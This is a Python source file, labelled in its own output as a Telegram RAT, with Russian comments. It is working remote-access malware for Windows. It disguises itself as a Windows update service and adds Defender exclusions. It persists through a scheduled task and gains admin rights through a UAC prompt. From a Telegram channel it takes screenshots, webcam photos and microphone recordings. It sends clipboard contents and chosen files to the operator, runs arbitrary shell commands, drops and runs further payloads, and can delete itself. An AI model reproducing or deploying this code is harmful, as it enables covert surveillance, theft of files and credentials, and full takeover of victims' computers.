import os
import sys
import telebot
from PIL import ImageGrab
import cv2
import subprocess
import tempfile
import ctypes
import time
import shutil
import winreg
import webbrowser
import pyperclip
import shlex
import pygame
import sounddevice as sd
from scipy.io.wavfile import write
import numpy as np
import pyautogui
import base64

import base64

# --- КОНФИГУРАЦИЯ (XOR + base64) ---
def xor_decrypt(encrypted_data, key="Z!g47aLuEbANN"):
    """Дешифровка XOR + base64 с кастомным ключом"""
    # Преобразуем ключ в список байт
    key_bytes = [ord(c) for c in key]
    decoded = base64.b64decode(encrypted_data)
    return ''.join(chr(b ^ key_bytes[i % len(key_bytes)]) for i, b in enumerate(decoded))

# Зашифрованные данные (XOR + base64 с ключом Z!g47aLuEbANN)
encrypted_token = "ВАШ_ТОКЕН_БОТА_ДЛЯ_ТЕЛЕГРАМА_ПРОЙДЕННЫЙ_ЧЕРЕЗ_ШИФРОВКУ_С_ПОМОЩЬЮ_ВТОРОГО_ПАЙТОН_ФАЙЛА"
encrypted_chat = " ВАШ_АЙДИ_ЧАТА_ТЕЛЕГРАМ_ПРОЙДЕННЫЙ_ЧЕРЕЗ_ШИФРОВКУ_С_ПОМОЩЬЮ_ВТОРОГО_ПАЙТОН_ФАЙЛА"

bot_token = xor_decrypt(encrypted_token)
chat_id = xor_decrypt(encrypted_chat)

# ====================== HELPER ДЛЯ УСТОЙЧИВОСТИ ======================
def safe_download(file_path, max_retries=3):
    """Безопасное скачивание файла с повторными попытками"""
    for attempt in range(max_retries):
        try:
            return bot.download_file(file_path)
        except Exception as e:
            if attempt == max_retries - 1:
                raise e
            time.sleep(2 ** attempt)  # exponential backoff
    return None

# ====================== УНИКАЛЬНЫЙ ИДЕНТИФИКАТОР ======================
hostname = os.getenv('COMPUTERNAME', 'unknown-pc')
unique_id = hostname

# Флаг для скрытого запуска процессов
CREATE_NO_WINDOW = 0x08000000

# --- ПАРАМЕТРЫ УСТАНОВКИ ---
install_dir = os.path.join(os.environ['programdata'], 'WindowsUpdateSvc')
payloads_dir = os.path.join(install_dir, 'payloads')
payload_name = "audiodg.exe"
install_path_full = os.path.join(install_dir, payload_name)
task_name = "WinUpdateSvc"

# Создаем папки
for d in [install_dir, payloads_dir]:
    if not os.path.exists(d):
        try: 
            os.makedirs(d)
        except: 
            pass

# ====================== ИНИЦИАЛИЗАЦИЯ БОТА ======================
try:
    bot = telebot.TeleBot(bot_token)
except Exception:
    time.sleep(10)
    sys.exit()

# ====================== АВТОЗАГРУЗКА ======================
def install_and_persist():
    try:
        if not os.path.exists(install_dir):
            os.makedirs(install_dir)
        
        shutil.copyfile(sys.executable, install_path_full)
        
        subprocess.run(f'powershell -command "Add-MpPreference -ExclusionPath \'{install_dir}\'"',
                       shell=True, capture_output=True, creationflags=CREATE_NO_WINDOW)
        
        subprocess.run(f'powershell -command "Add-MpPreference -ExclusionProcess \'{payload_name}\'"',
                       shell=True, capture_output=True, creationflags=CREATE_NO_WINDOW)
        
        subprocess.run(f'schtasks /delete /tn "{task_name}" /f', shell=True, capture_output=True, creationflags=CREATE_NO_WINDOW)
        time.sleep(2)
        
        schtasks_cmd = f'schtasks /create /tn "{task_name}" /tr "\"{install_path_full}\"" /sc onlogon /ru "%USERNAME%" /rl highest /it /f'
        
        result = subprocess.run(schtasks_cmd, shell=True, capture_output=True, text=True, creationflags=CREATE_NO_WINDOW)
        
        if result.returncode == 0:
            bot.send_message(chat_id, f"✅ **Успешное закрепление (onlogon) на {unique_id}.**", parse_mode="Markdown")
        else:
            error_output = result.stderr.strip() if result.stderr else result.stdout.strip()
            bot.send_message(chat_id, f"☠️ **Критическая ошибка закрепления на {unique_id}.**\n"
                                      f"Код ошибки: {result.returncode}\n"
                                      f"Вывод: `{error_output}`", parse_mode="Markdown")
        
        subprocess.Popen([install_path_full], creationflags=CREATE_NO_WINDOW)
        sys.exit(0)
        
    except Exception as e:
        bot.send_message(chat_id, f"☠️ **Ошибка установки на {unique_id}:**\n`{str(e)}`", parse_mode="Markdown")
        time.sleep(5)
        sys.exit(1)

@bot.channel_post_handler(commands=['list'])
def handle_list_channel(message):
    if str(message.chat.id) != str(chat_id): return
    bot.send_message(message.chat.id, f"🟢 **{unique_id}** на связи.", parse_mode="Markdown")

# --- САМОУНИЧТОЖЕНИЕ (ВЫЖЖЕННАЯ ЗЕМЛЯ) ---
@bot.channel_post_handler(commands=['killme'])
def handle_killme(message):
    if str(message.chat.id) != str(chat_id): return
    try:
        parts = shlex.split(message.text)
        if len(parts) < 2:
            bot.send_message(message.chat.id, f"Использование: `/killme {unique_id}`", parse_mode="Markdown")
            return
        
        target_host = parts[1]
        if target_host.lower() != unique_id.lower(): return

        bot.send_message(message.chat.id, f"☢️ **Инициирован протокол самоуничтожения на {unique_id}...**\nПрощай! 🫡", parse_mode="Markdown")
        
        subprocess.run(f'schtasks /delete /tn "{task_name}" /f', shell=True, capture_output=True, creationflags=CREATE_NO_WINDOW)
        
        bat_path = os.path.join(tempfile.gettempdir(), "suicide.bat")
        with open(bat_path, "w") as f:
            f.write("@echo off\n")
            f.write("timeout /t 3 /nobreak > NUL\n")
            f.write(f'del /f /q "{install_path_full}"\n')
            f.write(f'rmdir /s /q "{install_dir}"\n')
            f.write('del "%~f0"\n')
            
        subprocess.Popen(["cmd.exe", "/c", bat_path], shell=True, creationflags=CREATE_NO_WINDOW)
        sys.exit(0)

    except Exception as e:
        bot.send_message(message.chat.id, f"☠️ **Ошибка самоуничтожения на {unique_id}:**\n`{str(e)}`", parse_mode="Markdown")

# --- НАЖАТИЕ КЛАВИШ (с поддержкой комбинаций) ---
@bot.channel_post_handler(commands=['presskey'])
def handle_presskey(message):
    if str(message.chat.id) != str(chat_id): return
    try:
        parts = shlex.split(message.text)
        if len(parts) < 3:
            bot.send_message(message.chat.id, f"Использование: `/presskey {unique_id} <клавиши>`\n"
                                              f"Примеры:\n"
                                              f"`/presskey {unique_id} H`\n"
                                              f"`/presskey {unique_id} alt+f4`\n"
                                              f"`/presskey {unique_id} ctrl+shift+t`", parse_mode="Markdown")
            return
        
        target_host = parts[1]
        key_input = parts[2].lower()
        
        if target_host.lower() != unique_id.lower(): return

        if '+' in key_input:
            keys = [k.strip() for k in key_input.split('+')]
            pyautogui.hotkey(*keys)
            bot.send_message(message.chat.id, f"⌨️ **Нажата комбинация `{'+'.join(keys).upper()}` на {unique_id}**", parse_mode="Markdown")
        else:
            special_keys = {
                'enter': 'enter', 'space': 'space', 'tab': 'tab',
                'esc': 'esc', 'backspace': 'backspace',
                'up': 'up', 'down': 'down', 'left': 'left', 'right': 'right',
                'f1': 'f1', 'f2': 'f2', 'f3': 'f3', 'f4': 'f4', 'f5': 'f5',
                'f6': 'f6', 'f7': 'f7', 'f8': 'f8', 'f9': 'f9', 'f10': 'f10',
                'f11': 'f11', 'f12': 'f12'
            }
            key = special_keys.get(key_input, key_input)
            pyautogui.press(key)
            bot.send_message(message.chat.id, f"⌨️ **Нажата клавиша `{key_input.upper()}` на {unique_id}**", parse_mode="Markdown")

    except Exception as e:
        bot.send_message(message.chat.id, f"☠️ **Ошибка нажатия клавиш на {unique_id}:**\n`{str(e)}`", parse_mode="Markdown")

@bot.channel_post_handler(commands=['screen', 'webcam', 'off', 'restart', 'buffer', 'micro'])
def handle_simple_targeted_commands(message):
    if str(message.chat.id) != str(chat_id): return
    try:
        parts = shlex.split(message.text)
        command = parts[0].replace('/', '')
        if len(parts) < 2:
            bot.send_message(message.chat.id, f"Использование: `/{command} {unique_id}`", parse_mode="Markdown")
            return
        
        target_host = parts[1]
        if target_host.lower() != unique_id.lower(): return

        if command == 'screen':
            try:
                screenshot = ImageGrab.grab(all_screens=True)
                path = os.path.join(tempfile.gettempdir(), 'screenshot.png')
                screenshot.save(path, quality=95)
                with open(path, 'rb') as photo:
                    bot.send_photo(message.chat.id, photo, caption=f"✅ Скриншот с **{unique_id}**", parse_mode="Markdown")
                os.remove(path)
            except Exception as screen_err:
                bot.send_message(message.chat.id, f"⚠️ **Не удалось захватить скриншот**\n`{str(screen_err)}`", parse_mode="Markdown")

        elif command == 'webcam':
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                bot.send_message(message.chat.id, f"Камера на **{unique_id}** не найдена.", parse_mode="Markdown")
                return
            time.sleep(1)
            ret, frame = cap.read()
            cap.release()
            if ret:
                path = os.path.join(tempfile.gettempdir(), 'webcam.jpg')
                cv2.imwrite(path, frame)
                with open(path, 'rb') as photo:
                    bot.send_photo(message.chat.id, photo, caption=f"Фото с камеры **{unique_id}**", parse_mode="Markdown")
                os.remove(path)
            else:
                bot.send_message(message.chat.id, f"Не удалось захватить кадр с камеры на **{unique_id}**.", parse_mode="Markdown")

        elif command == 'off':
            bot.send_message(message.chat.id, f"🔴 **{unique_id}** выключается...", parse_mode="Markdown")
            time.sleep(1)
            subprocess.run('shutdown /s /t 1', shell=True, creationflags=CREATE_NO_WINDOW)

        elif command == 'restart':
            bot.send_message(message.chat.id, f"🟡 **{unique_id}** перезагружается...", parse_mode="Markdown")
            time.sleep(1)
            subprocess.run('shutdown /r /t 1', shell=True, creationflags=CREATE_NO_WINDOW)

        elif command == 'buffer':
            clipboard_content = pyperclip.paste()
            if not clipboard_content:
                response_text = f"Буфер обмена на **{unique_id}** пуст."
            else:
                response_text = f"Буфер обмена **{unique_id}**:\n\n```{clipboard_content}```"
            bot.send_message(message.chat.id, response_text, parse_mode="Markdown")
        
        elif command == 'micro':
            try:
                duration = 10
                fs = 44100
                bot.send_message(message.chat.id, f"🎙️ Записываю 10 секунд с микрофона **{unique_id}**...", parse_mode="Markdown")
                recording = sd.rec(int(duration * fs), samplerate=fs, channels=1, dtype='int16')
                sd.wait()
                path = os.path.join(tempfile.gettempdir(), 'micro_rec.wav')
                write(path, fs, recording)
                with open(path, 'rb') as audio:
                    bot.send_audio(message.chat.id, audio, caption=f"Запись с **{unique_id}**", parse_mode="Markdown")
                os.remove(path)
            except Exception as e:
                bot.send_message(message.chat.id, f"🚫 Не удалось записать звук с **{unique_id}**. Возможно, нет микрофона.\n`{e}`", parse_mode="Markdown")

    except Exception as e:
        bot.send_message(message.chat.id, f"☠️ **Ошибка команды на {unique_id}:**\n`{str(e)}`", parse_mode="Markdown")

@bot.channel_post_handler(commands=['cmd', 'browser'])
def handle_complex_targeted_commands(message):
    if str(message.chat.id) != str(chat_id): return
    try:
        parts = shlex.split(message.text)
        command_name = parts[0].replace('/', '')

        if len(parts) < 3:
            usage = f"`/{command_name} {unique_id} <аргумент>`"
            bot.send_message(message.chat.id, f"Использование: {usage}", parse_mode="Markdown")
            return
        
        target_host, argument = parts[1], " ".join(parts[2:])
        if target_host.lower() != unique_id.lower(): return

        if command_name == 'cmd':
            result = subprocess.run(argument, shell=True, capture_output=True, encoding='cp866', errors='ignore', creationflags=CREATE_NO_WINDOW)
            output = (f"Вывод с {unique_id}:\n---\n" + (result.stdout + result.stderr)).strip()
            if not (result.stdout + result.stderr): output += "[Команда выполнена, вывода нет]"
            for i in range(0, len(output), 4000):
                bot.send_message(message.chat.id, f"```{output[i:i+4000]}```", parse_mode="Markdown")

        elif command_name == 'browser':
            webbrowser.open(argument)
            bot.send_message(message.chat.id, f"✅ На **{unique_id}** открыта ссылка: `{argument}`", parse_mode="Markdown")

    except Exception as e:
        bot.send_message(message.chat.id, f"☠️ **Ошибка команды на {unique_id}:**\n`{str(e)}`", parse_mode="Markdown")

# --- ОБОИ ---
@bot.channel_post_handler(content_types=['photo', 'document'], func=lambda m: m.caption and m.caption.startswith('/wallpaper'))
def handle_wallpaper(message):
    if str(message.chat.id) != str(chat_id): return
    try:
        parts = shlex.split(message.caption)
        if len(parts) < 2: return
        target_host = parts[1]
        if target_host.lower() != unique_id.lower(): return

        if message.photo:
            file_id = message.photo[-1].file_id
            ext = '.jpg'
        else:
            file_id = message.document.file_id
            ext = os.path.splitext(message.document.file_name)[1] or '.jpg'

        file_info = bot.get_file(file_id)
        downloaded = safe_download(file_info.file_path)

        if downloaded is None:
            raise Exception("Не удалось скачать изображение")

        wp_path = os.path.join(install_dir, f'wallpaper{ext}')
        with open(wp_path, 'wb') as f:
            f.write(downloaded)

        ctypes.windll.user32.SystemParametersInfoW(20, 0, wp_path, 3)
        bot.send_message(message.chat.id, f"🖼️ Обои успешно изменены на **{unique_id}**", parse_mode="Markdown")

    except Exception as e:
        bot.send_message(message.chat.id, f"☠️ **Ошибка смены обоев на {unique_id}:**\n`{str(e)}`", parse_mode="Markdown")

# --- ЗВУК ---
@bot.channel_post_handler(content_types=['audio', 'voice', 'document'], func=lambda m: m.caption and m.caption.startswith('/play'))
def handle_play_audio(message):
    if str(message.chat.id) != str(chat_id): return
    try:
        parts = shlex.split(message.caption)
        if len(parts) < 2: return
        target_host = parts[1]
        if target_host.lower() != unique_id.lower(): return

        if message.audio:
            file_id = message.audio.file_id
            ext = '.mp3'
        elif message.voice:
            file_id = message.voice.file_id
            ext = '.ogg'
        else:
            file_id = message.document.file_id
            ext = os.path.splitext(message.document.file_name)[1] or '.mp3'

        file_info = bot.get_file(file_id)
        downloaded = safe_download(file_info.file_path)

        if downloaded is None:
            raise Exception("Не удалось скачать аудио")

        audio_path = os.path.join(tempfile.gettempdir(), f'play_audio{ext}')
        with open(audio_path, 'wb') as f:
            f.write(downloaded)

        pygame.mixer.init()
        pygame.mixer.music.load(audio_path)
        pygame.mixer.music.play()
        
        bot.send_message(message.chat.id, f"🔊 Воспроизвожу звук на **{unique_id}**", parse_mode="Markdown")

    except Exception as e:
        bot.send_message(message.chat.id, f"☠️ **Ошибка воспроизведения звука на {unique_id}:**\n`{str(e)}`", parse_mode="Markdown")
        
# --- ДРОППЕР: ЗАГРУЗКА PAYLOAD'ОВ (.EXE) ---
@bot.channel_post_handler(content_types=['document'], func=lambda m: m.caption and m.caption.startswith('/upload'))
def handle_upload_payload(message):
    if str(message.chat.id) != str(chat_id): return
    try:
        parts = shlex.split(message.caption)
        if len(parts) < 2: return
        target_host = parts[1]
        if target_host.lower() != unique_id.lower(): return

        bot.send_message(message.chat.id, f"📥 Загружаю файл на **{unique_id}**...", parse_mode="Markdown")

        file_info = bot.get_file(message.document.file_id)
        downloaded = safe_download(file_info.file_path)

        if downloaded is None:
            raise Exception("Не удалось скачать файл после нескольких попыток")

        filename = message.document.file_name or f"file_{int(time.time())}.dat"
        save_path = os.path.join(payloads_dir, filename)
        
        with open(save_path, 'wb') as f:
            f.write(downloaded)
            
        bot.send_message(message.chat.id, f"✅ **Файл успешно загружен на {unique_id}!**\n"
                                          f"Имя: `{filename}`\nПуть: `{save_path}`\n\n"
                                          f"Запуск: `/execute {unique_id} {filename}`", 
                         parse_mode="Markdown")

    except Exception as e:
        bot.send_message(message.chat.id, f"☠️ **Ошибка загрузки на {unique_id}:**\n`{str(e)}`", parse_mode="Markdown")

# --- ДРОППЕР: ЗАПУСК PAYLOAD'ОВ ---
@bot.channel_post_handler(commands=['execute'])
def handle_execute_payload(message):
    if str(message.chat.id) != str(chat_id): return
    try:
        parts = shlex.split(message.text)
        if len(parts) < 3:
            bot.send_message(message.chat.id, f"Использование: `/execute {unique_id} <имя_файла.exe>`", parse_mode="Markdown")
            return
        
        target_host = parts[1]
        if target_host.lower() != unique_id.lower(): return
        
        filename = parts[2]
        file_path = os.path.join(payloads_dir, filename)
        
        if not os.path.exists(file_path):
            if os.path.exists(filename):
                file_path = filename
            else:
                bot.send_message(message.chat.id, f"❌ Файл не найден в директории пейлоадов:\n`{file_path}`", parse_mode="Markdown")
                return
        
        subprocess.Popen(file_path, shell=True, creationflags=CREATE_NO_WINDOW)
        bot.send_message(message.chat.id, f"🔥 **Пейлоад запущен на {unique_id}!**\nПроцесс: `{filename}`", parse_mode="Markdown")
        
    except Exception as e:
        bot.send_message(message.chat.id, f"☠️ **Ошибка запуска на {unique_id}:**\n`{str(e)}`", parse_mode="Markdown")

# --- РАЗВЕДКА И ЭКСПОРТ ---
@bot.channel_post_handler(commands=['files', 'export'])
def handle_file_manager(message):
    if str(message.chat.id) != str(chat_id): return
    try:
        parts = shlex.split(message.text)
        command = parts[0].replace('/', '').lower()
        
        if len(parts) < 2:
            bot.send_message(message.chat.id, f"Использование:\n`/files {unique_id}`\n`/export {unique_id} \"C:\\путь\\к\\файлу\"`", parse_mode="Markdown")
            return
        
        target_host = parts[1]
        if target_host.lower() != unique_id.lower(): return

        if command == 'files':
            user_profile = os.path.expanduser('~')
            target_folders = ['Desktop', 'Documents', 'Downloads']
            
            output = f"🔎 **Поверхностная разведка файлов на {unique_id}:**\n\n"
            
            for folder in target_folders:
                folder_path = os.path.join(user_profile, folder)
                output += f"📁 **{folder}** (`{folder_path}`):\n"
                
                if os.path.exists(folder_path):
                    try:
                        items = os.listdir(folder_path)
                        files = [f for f in items if os.path.isfile(os.path.join(folder_path, f))]
                        folders = [f for f in items if os.path.isdir(os.path.join(folder_path, f))]
                        
                        if not files and not folders:
                            output += "  *(пусто)*\n"
                        else:
                            for d in folders[:5]:
                                output += f"  📂 {d}\n"
                            if len(folders) > 5:
                                output += f"  ... и еще {len(folders)-5} папок.\n"
                                
                            for f in files[:20]:
                                size_kb = os.path.getsize(os.path.join(folder_path, f)) / 1024
                                output += f"  📄 {f} ({size_kb:.1f} KB)\n"
                            if len(files) > 20:
                                output += f"  ... и еще {len(files)-20} файлов.\n"
                    except Exception as e:
                        output += f"  *(ошибка доступа: {e})*\n"
                else:
                    output += "  *(папка не найдена)*\n"
                output += "\n"
            
            output += "💡 *Используй /cmd <хост> dir \"путь\" для глубокого просмотра.*"
            
            for i in range(0, len(output), 4000):
                bot.send_message(message.chat.id, output[i:i+4000], parse_mode="Markdown")

        elif command == 'export':
            if len(parts) < 3:
                bot.send_message(message.chat.id, f"Укажи путь! Пример:\n`/export {unique_id} \"C:\\Users\\Имя\\Desktop\\passwords.txt\"`", parse_mode="Markdown")
                return
            
            filepath = " ".join(parts[2:])
            
            if not os.path.exists(filepath):
                bot.send_message(message.chat.id, f"❌ Файл не найден:\n`{filepath}`", parse_mode="Markdown")
                return
            
            if not os.path.isfile(filepath):
                bot.send_message(message.chat.id, f"❌ Это не файл (возможно, папка):\n`{filepath}`", parse_mode="Markdown")
                return
                
            file_size_mb = os.path.getsize(filepath) / (1024 * 1024)
            
            if file_size_mb > 49.0:
                bot.send_message(message.chat.id, f"⚠️ **ОТМЕНА:** Файл весит **{file_size_mb:.2f} МБ**.\nЛимит Telegram для ботов — 50 МБ.", parse_mode="Markdown")
                return
                
            bot.send_message(message.chat.id, f"📤 Отправляю файл `{os.path.basename(filepath)}` ({file_size_mb:.2f} МБ)...", parse_mode="Markdown")
            
            try:
                with open(filepath, 'rb') as doc:
                    bot.send_document(message.chat.id, doc, caption=f"📄 Файл с **{unique_id}**\nПуть: `{filepath}`", parse_mode="Markdown")
            except Exception as e:
                bot.send_message(message.chat.id, f"☠️ Ошибка чтения файла:\n`{str(e)}`", parse_mode="Markdown")

    except Exception as e:
        bot.send_message(message.chat.id, f"☠️ **Ошибка файлового менеджера на {unique_id}:**\n`{str(e)}`", parse_mode="Markdown")

# --- ТОЧКА ВХОДА ---
if __name__ == "__main__":
    if os.path.abspath(sys.executable).lower() != install_path_full.lower():
        if ctypes.windll.shell32.IsUserAnAdmin():
            install_and_persist()
        else:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit(0)
    
    # Улучшенный polling с автоматическим переподключением
    print(f"[{unique_id}] Запуск Telegram RAT...")
    
    while True:
        try:
            bot.send_message(chat_id, f"🟢 **{unique_id}** сессия онлайн", parse_mode="Markdown")
            print(f"[{unique_id}] Подключено к Telegram.")
            
            bot.polling(none_stop=True, timeout=60, long_polling_timeout=60)
            
        except Exception as e:
            error_str = str(e)
            if "RemoteDisconnected" in error_str or "Connection aborted" in error_str or "Connection reset" in error_str:
                print(f"[{unique_id}] Потеря соединения. Переподключение через 15 сек...")
            else:
                print(f"[{unique_id}] Ошибка: {error_str}")
            
            time.sleep(15)  # Пауза перед переподключением
            continue